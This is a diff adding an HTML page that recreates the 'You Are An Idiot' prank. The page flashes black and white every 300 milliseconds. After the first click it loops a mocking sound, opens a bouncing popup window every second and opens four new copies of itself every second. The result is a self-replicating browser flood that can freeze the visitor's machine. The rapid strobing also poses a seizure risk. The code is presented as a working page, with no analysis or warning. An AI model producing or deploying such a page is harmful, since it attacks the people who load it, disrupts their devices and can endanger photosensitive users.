@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>You Are An Idiot!</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: black;
+      color: white;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      font-size: 3em;
+      text-align: center;
+      overflow: hidden;
+    }
+  </style>
+</head>
+<body>
+  <div id="content">
+    YOU ARE AN IDIOT<br>
+    ت &nbsp; ت &nbsp; ت
+  </div>
+
+  <audio id="sound" src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" loop></audio>
+
+  <script>
+    let color = false;
+    setInterval(() => {
+      document.body.style.backgroundColor = color ? 'white' : 'black';
+      document.body.style.color = color ? 'black' : 'white';
+      color = !color;
+    }, 300);
+
+    let started = false;
+
+    document.body.onclick = () => {
+      if (started) return;
+      started = true;
+
+      document.getElementById('sound').play();
+
+      // Open new bouncing popup windows every second
+      setInterval(() => {
+        let win = window.open("", "", "width=300,height=200");
+        if (win) {
+          win.document.write(`
+            <html>
+              <head><title>YOU ARE AN IDIOT</title></head>
+              <body style="background:black;color:white;font-size:2em;display:flex;justify-content:center;align-items:center;height:100%;text-align:center;">
+                YOU ARE AN IDIOT<br>ت &nbsp; ت &nbsp; ت
+              </body>
+            </html>
+          `);
+
+          // Bouncing movement
+          let x = 100, y = 100;
+          let dx = 10, dy = 10;
+          setInterval(() => {
+            try {
+              win.moveTo(x, y);
+              x += dx;
+              y += dy;
+              if (x <= 0 || x + 300 >= screen.availWidth) dx = -dx;
+              if (y <= 0 || y + 200 >= screen.availHeight) dy = -dy;
+            } catch (e) {}
+          }, 50);
+        }
+      }, 1000); // 1 per second
+
+      // Also open 4 tabs per second in background
+      setInterval(() => {
+        for (let i = 0; i < 4; i++) {
+          window.open(location.href, '_blank');
+        }
+      }, 1000);
+    };
+  </script>
+</body>
+</html>
